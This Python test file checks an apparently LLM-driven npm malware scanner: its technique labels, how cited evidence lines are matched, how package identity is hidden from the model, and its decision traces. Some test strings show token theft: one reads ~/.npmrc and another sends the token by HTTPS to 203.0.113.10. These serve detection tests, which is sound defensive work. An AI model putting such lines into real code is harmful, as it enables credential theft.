"""L1–L3 anti-rote checks (Gate B0 2026-11-05). Fixtures are read statically; nothing is executed."""

import json
from pathlib import Path

from agent.run import FORMAT_SCHEMA, SYSTEM, analyze
from agent.semantics import (BLIND_ALIAS, HIDDEN, TECHNIQUES, blind_read, identity_lines, shows_technique,
                             technique_family)
from agent.trace import TraceWriter

TWIN_EVIL = Path(__file__).parent / "fixtures" / "corpus" / "twin-evil"


def test_vocabulary_is_enforced_only_while_generating():
    technique = FORMAT_SCHEMA["$defs"]["Behavior"]["properties"]["technique"]
    assert technique["enum"] == list(TECHNIQUES) and "other" in technique["enum"]
    assert all(word in SYSTEM for word in TECHNIQUES)


def test_free_text_maps_to_a_family_or_other():
    assert technique_family("read-secret-file") == "read-secret-file"
    assert technique_family("child_process.execFileSync") == "execute-process"
    assert technique_family("Credential exfiltration") == "read-secret-file"
    assert technique_family("local output") == "other"
    assert technique_family("minification") == "other"


def test_cited_line_must_show_the_technique():
    line = "const token = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');"
    assert shows_technique("read-secret-file", line)
    assert not shows_technique("network-request", line)
    assert shows_technique("network-request", "https.request({ host: '203.0.113.10' }).end(token);")
    assert shows_technique("other", "const a = 1;")
    # Only binding.gyp may stand for a native build by its name; a file name proves nothing else.
    assert shows_technique("native-build", '{"targets": []}', "binding.gyp")
    assert not shows_technique("download-code", "const a = 1;", "download.js")


def test_identity_lines_cover_multi_line_values_and_keep_scripts():
    text = "\n".join(['{', '  "name": "x",', '  "author": {', '    "name": "Someone"', '  },',
                      '  "keywords": ["a",', '    "b"],', '  "scripts": {', '    "name": "kept"', '  }', '}'])
    assert identity_lines(text) == {2, 3, 4, 5, 6, 7}
    masked = blind_read("\n".join(text.splitlines()[1:4]), 2, identity_lines(text)).split("\n")
    assert masked == [HIDDEN, HIDDEN, HIDDEN]


def model_sees_no_identity(messages: list[dict]) -> None:
    seen = json.dumps(messages, ensure_ascii=False)
    assert "probe-twin-b" not in seen and "Build helper" not in seen and BLIND_ALIAS in seen


def evil_verdict(technique: str, lines: str) -> dict:
    return {"package": "anything", "label": "malicious", "confidence": 0.95,
            "description": "Reads the npm token and posts it to a remote address",
            "behaviors": [{"behavior": "Sends npm token away", "technique": technique, "severity": "high",
                           "evidence": {"file": "setup.js", "lines": lines},
                           "analysis": "Home .npmrc is read and sent by HTTPS POST.", "impact": "Token theft."}],
            "action": "deny", "remediation": ["Rotate the npm token"]}


def run(tmp_path, final_replies: list[dict]):
    replies = iter([
        {"role": "assistant", "tool_calls": [{"function": {"name": "read_manifest", "arguments": {}}},
                                             {"function": {"name": "read_file", "arguments": {"file": "package.json"}}},
                                             {"function": {"name": "read_file", "arguments": {"file": "setup.js"}}}]},
        *({"role": "assistant", "content": json.dumps(reply)} for reply in final_replies),
    ])
    writer = TraceWriter(tmp_path / "run", "probe")
    seen = []

    def chat(_model, messages, final=False, **_kwargs):
        seen.append(json.loads(json.dumps(messages)))
        return next(replies)

    result, steps = analyze(str(TWIN_EVIL), "fake", chat=chat, trace=writer)
    events = [json.loads(line) for line in writer.path.read_text(encoding="utf-8").splitlines()]
    return result, steps, seen, events


def test_model_never_sees_name_or_description_but_verdict_keeps_real_id(tmp_path):
    result, _, seen, events = run(tmp_path, [evil_verdict("read-secret-file", "8-9")])
    for messages in seen:
        model_sees_no_identity(messages)
    decision = next(event for event in events if event["type"] == "decision")
    assert result.package == "probe-twin-b@1.0.0" and decision["rule"] == "R6"


def test_mismatched_claim_is_sent_back_once_then_not_counted(tmp_path):
    # Line 1 only imports fs: it shows no network request, so the deny cannot rest on it.
    wrong = evil_verdict("network-request", "1")
    result, steps, seen, events = run(tmp_path, [wrong, wrong])
    assert "evidence mismatch" in seen[2][-1]["content"]
    assert [event["message"] for event in events if event.get("kind") == "evidence_mismatch"] == [
        "setup.js:1 does not show network-request"]
    assert (result.label, result.action, steps) == ("suspicious", "review", 3)
    assert next(event for event in events if event["type"] == "decision")["rule"] == "R3"


def test_malicious_claim_needs_a_specific_technique(tmp_path):
    vague = evil_verdict("other", "9")
    result, _, _, events = run(tmp_path, [vague, vague])
    assert result.action == "review"
    assert any("no specific technique" in event.get("message", "") for event in events)


def test_model_sees_numbered_lines_but_trace_keeps_raw_source(tmp_path):
    _, _, seen, events = run(tmp_path, [evil_verdict("read-secret-file", "8-9")])
    tool_texts = [message["content"] for message in seen[1] if message["role"] == "tool"]
    assert any("8| const token = fs.readFileSync" in text for text in tool_texts)
    previews = [event.get("data_preview") or "" for event in events if event["type"] == "tool_result"]
    assert any(text.startswith("const fs = require") for text in previews)


def test_package_manager_install_counts_as_download():
    line = 'child_process.execSync(`npm install --no-save @swc/wasm@${version}`, { cwd: installDir });'
    assert shows_technique("download-code", line) and shows_technique("execute-process", line)
    assert not shows_technique("read-secret-file", "        let stats;")


def test_vocabulary_offers_neutral_actions_first():
    # An all-alarming list made A-SLM label every package suspicious (ablation 2026-11-05).
    words = list(TECHNIQUES)
    assert words[:3] == ["print-output", "read-package-file", "write-package-file"]
    assert words.index("read-package-file") < words.index("read-secret-file")
    assert "not whether it is harmful" in SYSTEM
    assert shows_technique("read-package-file", "const expected = require('./checksums.json');")
    assert not shows_technique("read-secret-file", "fs.readFileSync(path.join(__dirname, 'data.json'))")
